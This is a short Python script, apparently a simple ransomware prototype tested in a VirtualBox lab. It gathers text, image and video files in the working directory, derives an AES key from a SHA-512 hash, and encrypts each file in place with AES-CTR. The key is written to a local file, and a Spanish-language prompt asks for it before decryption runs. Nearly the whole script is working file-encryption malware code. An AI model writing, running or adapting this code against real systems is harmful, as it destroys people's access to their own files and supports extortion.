import os
import random
import hashlib
import socket
from Crypto.Util import Counter
from Crypto.Cipher import AES

current_user = os.getlogin()
target_directory = r'C:\Users\vboxuser\Desktop\asa'.format(current_user)
target_directory = os.path.abspath('')
file_list = os.listdir(target_directory)
file_list = [file for file in file_list if not file.startswith('.')]
file_extensions = [".txt", ".jpg", ".jpeg", "mp4", "png", ".rtf"]

def generate_symmetric_key():
    unique_string = target_directory + socket.gethostname() + str(random.randint(0, 10**50))
    unique_string = unique_string.encode('utf-8')
    hashed_value = hashlib.sha512(unique_string).hexdigest()
    key_chars = []
    for char in hashed_value:
        if len(key_chars) == 32:
            break
        key_chars.append(char)
    return ''.join(key_chars)

def process_file(file_path, crypto_function, block_size=16):
    with open(file_path, 'r+b') as file:
        while True:
            chunk = file.read(block_size)
            if not chunk:
                break
            processed_chunk = crypto_function(chunk)
            if len(chunk) != len(processed_chunk):
                raise ValueError('Block size mismatch during encryption/decryption.')
            file.seek(-len(chunk), 1)
            file.write(processed_chunk)

def process(key):
    with open('tracked_files', 'w') as tracked_files:
        for ext in file_extensions:
            for file in file_list:
                if file.endswith(ext):
                    tracked_files.write(os.path.join(file) + '\n')

    with open('tracked_files', 'r') as tracked_files:
        files_to_process = [line.strip() for line in tracked_files.readlines() if line.strip()]

    if os.path.exists('stored_key'):
        entered_key = input('Llave de prueba >>>  ')
        with open('stored_key', 'r') as key_file:
            stored_key = key_file.read().strip()
        if entered_key == stored_key:
            counter = Counter.new(128)
            crypto = AES.new(stored_key.encode('utf-8'), AES.MODE_CTR, counter=counter)
            for file in files_to_process:
                process_file(file, crypto.decrypt)
    else:
        counter = Counter.new(128)
        crypto = AES.new(key, AES.MODE_CTR, counter=counter)
        with open('stored_key', 'w') as key_file:
            key_file.write(key.decode('utf-8'))
        for file in files_to_process:
            process_file(file, crypto.encrypt)

def run_program():
    symmetric_key = generate_symmetric_key()
    process(symmetric_key.encode('utf-8'))

if __name__ == '__main__':
    try:
        run_program()
    except KeyboardInterrupt:
        exit()
